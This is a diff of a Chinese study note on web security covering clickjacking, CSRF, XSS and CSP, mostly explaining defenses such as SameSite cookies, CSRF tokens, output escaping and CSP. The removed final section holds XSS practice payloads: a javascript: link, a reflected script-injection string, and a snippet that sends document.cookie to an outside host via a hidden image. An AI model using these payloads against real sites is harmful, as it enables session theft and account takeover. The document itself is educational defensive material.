@@ -1,13 +1,22 @@
 # web 安全
 
-## 点击劫持
+## 点击劫持(clickjacking)
 
 原理：攻击者使用透明的 iframe 覆盖在网页上，诱使用户在点击，
 
 1. flash 点击劫持：用过 flash 游戏，让用户完成一系列复杂的操作
-2. 图片覆盖攻击 Cross Site Image Overlaying（XSIO）：
+2. 图片覆盖攻击 Cross Site Image Overlaying（XSIO）
 
-## [CSFR](https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/)
+防护：
+
+- **X-Frame-Options**
+  - X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在 \<frame\>, \<iframe\>或者 \<object\> 中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持 的攻击。
+
+## [CSRF](https://juejin.im/post/5ce55b3d5188253386140dd0#heading-4)
+
+CSRF(Cross Site Request Forgery)指的是跨站请求伪造
+
+[前端安全系列（二）：如何防止CSRF攻击？ - 美团技术团队](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)
 
 ### 概念
 
@@ -30,44 +39,56 @@
 
 ### [防护](https://zhuanlan.zhihu.com/p/40588156)
 
-- referer check
+根据CSRF的特点我们有以下防护措施
 
-- 验证码
+1. 校验请求来源
+   1. 阻止不明请求
+      1. [设置cookies的sameSite属性的值为strict或者lax](https://blog.csdn.net/sinat_36521655/article/details/104844667)
+         1. 这样只有同源网站的请求才会带上cookies。
+      2. 同源检测
+         1. 根据Origin限制跨域请求
+         2. 限制[referer](https://www.ruanyifeng.com/blog/2019/06/http-referer.html)：把Referrer Policy的策略设置成same-origin 可通过CSP
+   2. 请求时要求附加本域才能获取的信息
+      1. 验证csrf token：服务端随机生成token，保存在服务端session中，同时保存到客户端中，客户端发送请求时，把token带到HTTP请求头或参数中，服务端接收到请求，验证请求中的token与session中的是否一致。
+         1. 前后端不分离：token可以直接在编译模板的过程中写到表单的隐藏字段中，这样发送请求不需要额外的操作；
+         2. 前后端分离：双重cookie校验
+            1. token可以在登录时写入到cookies中，发送请求时，js读取cookies中的token，并设置到HTTP请求头中。
+               axios有相关配置如下
+               ![img](https://picx.zhimg.com/80/v2-7ea9e31f1d90b2eb816e93d680e6e82b_720w.webp?source=1940ef5c)
+   3. 保证网络请求由真实用户发出
+      - 用户操作限制（验证码）
+2. 不使用cookie，使用token校验用户身份，换用token标识用户身份，放到请求头里面
 
-- anti csfr token（普遍做法）
+## [XSS](https://juejin.cn/post/6844903685122703367#heading-13)
 
-- **验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证**
+Cross-site scripting，跨站脚本攻击。HTMl 注入插入恶意脚本，篡改网页，在用户浏览网页时，控制用户浏览器的一种攻击
 
-- 同源检测防护
-  1. origin（没有 path 和 query）
-     - 在 IE 同源定义不一致
-     - 302 重定向
-       2 referer check（请求的来源地址）
-  - 可以被修改
-- csfr `Token`
-  在会话中存储 CSRF Token 比较繁琐，而且不能在通用的拦截上统一处理所有的接口
+[XSS 跨站脚本攻击 - JavaScript Guidebook](https://tsejx.github.io/javascript-guidebook/computer-networks/web-security/xss/#%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5)
 
-- `验证码`和密码
-  确认是用户自身的行为
+[js-xss/README.zh.md at master · leizongmin/js-xss](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
 
-- 双重 cookie 验证，生成一个随机 cookie 并且在请求时附带在 url 里面，后端就可以验证
-
-- cookie 设置 samesite 属性、如果 SamesiteCookie 被设置为 Strict，浏览器在任何跨域请求中都不会携带 Cookie
-
-## [XSS：跨站脚本攻击](https://www.freebuf.com/articles/web/185654.html)
-
-[XSS](https://juejin.im/post/5bad9140e51d450e935c6d64#heading-13)
-
-HTMl 注入插入恶意脚本，篡改网页，在用户浏览网页时，控制用户浏览器的一种攻击，一开始的演示案例是跨域的。
+主要经过以下两个步骤
 
 1. 攻击者提交恶意代码。
 2. 浏览器执行恶意代码。
 
-### 分类：
+### 分类
 
-1. 存储型 XSS：也叫持久性 XSS，恶意代码提交到`服务器端`中，`服务端`拼接 html 返回，再在前端解析执行。常见于评论、私信、发博客。所有查看了该博客该评论的用户，都会执行这段恶意脚本
-2. **反射性**XSS：也叫非持久性 XSS，输入恶意代码，通过`URL`提交执行，`服务端`取出恶意代码，拼接在 html 时返回，浏览器请求再执行恶意代码。
-3. Dom 型 XSS：`前端`取出`URL`中的恶意代码执行，通过修改页面的 dom 节点形成的 XSS，称为 dom based XSS。
+1. 存储型 XSS：也叫持久性 XSS，恶意代码提交到`服务器端`中，`服务端`拼接 html 返回，再在前端解析执行。
+   1. **常见于评论、私信、发博客**。所有查看了该博客该评论的用户，都会执行这段恶意脚本
+   2. XSS 蠕虫：**在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作**，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。
+2. 反射性XSS：也叫非持久性 XSS，输入恶意代码，通过`URL`提交执行，`服务端`取出恶意代码，拼接在 html 时返回，浏览器请求再执行恶意代码。
+   1. 出现于前后端未分离的项目，后端控制前端渲染的情况下才会出现，如果是前后端分离的情况则属于DOM型XSS
+   1. 常见于 **通过 URL 传递参数** 的功能，如网站搜索、跳转等
+3. Dom 型 XSS：`前端`取出`URL`中的恶意代码执行，通过修改页面的 dom 节点形成的 XSS，称为 dom based XSS
+   - 
+
+## 总结
+
+- 防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。
+  - 存储型和反射型由于代码是存储到服务端的，需要服务端做xss防范
+  - 而DOM型是纯前端获取与展示，需要前端做xss防范
+- 转义应该在输出 HTML 时进行，而不是在提交用户输入时。
 
 ### 攻击方式
 
@@ -88,12 +109,13 @@ HTMl 注入插入恶意脚本，篡改网页，在用户浏览网页时，控制
 
 ### 预防
 
-1. 设置 httponly 缓解 xss，可以通过 trace 请求读取 httponly cookie 反
-2. 输入检查，输出检查
-3. 输入过滤（输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。）
-4. 预防存储型和反射型 XSS 攻击：改成纯前端渲染、充分转义
-5. 预防 DOM 型 XSS 攻击：避免使用 DOM 中的内联事件监听器，
-6. 使用 CSP
+- 输入过滤（输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。）
+  - 输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的
+- 转义 HTML
+  - 不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。 业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。
+- 设置 cookie的httponly 缓解 xss，可以通过 trace 请求读取 httponly cookie 
+- 预防 DOM 型 XSS 攻击：避免使用 DOM 中的内联事件监听器，
+- 使用 CSP
 
 ## [CSP（Content Security Policy）内容安全策略检查](http://www.ruanyifeng.com/blog/2016/09/csp.html)
 
@@ -121,30 +143,3 @@ HTMl 注入插入恶意脚本，篡改网页，在用户浏览网页时，控制
   - 其他资源：没有限制
 
   参考：[前端安全配置之 Content-Security-Policy(csp)](https://www.cnblogs.com/heyuqing/p/6215761.html)
-
-### **referer**
-
-在以下两种情况下，Referer 不会被发送：
-来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI；
-当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。
-
-### XSS 实践
-
-页面中插入链接点击会执行
-
-```
-<a href="javascript:alert(localStorage)">跳转</a>
-
-<a href="http://xxx/search?keyword="><script>alert('XSS');</script>"></a>
-=>拼接后
-<input type="text" value=""><script>alert('XSS');</script>">
-```
-
-发送 cookie 给对应站点
-
-```
-  var img = document.createElement('img')
-  img.src='http://www.xss.com?cookie=' + document.cookie
-  img.style.display='none'
-  document.getElementsByTagName('body')[0].appendChild(img)
-```
